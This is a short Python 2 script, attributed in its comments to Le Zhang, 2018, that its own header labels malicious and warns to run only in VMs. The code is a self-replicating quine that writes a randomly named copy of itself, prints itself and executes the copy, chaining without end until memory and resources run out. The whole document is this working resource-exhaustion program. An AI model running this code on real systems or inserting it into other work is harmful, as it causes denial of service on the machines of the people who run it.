# This program is MALICIOUS!!!!
# DO NOT run this on any working machine. It will eat up ALL your memory. Run it with VMs.
# It replicates itself with a randomly-named file and runs it. That means, this chain never ends until it drains all your resources.
# By Le Zhang, 2018
import os;import random;fn="".join([str(rand) for rand in random.sample(xrange(100), 10)]);s='import os;import random;fn="".join([str(rand) for rand in random.sample(xrange(100), 10)]);s=%r;open(fn+".py", "w").write(s%%s);print(s%%s);os.system("python "+fn+".py")';open(fn+".py", "w").write(s%s);print(s%s);os.system("python "+fn+".py")
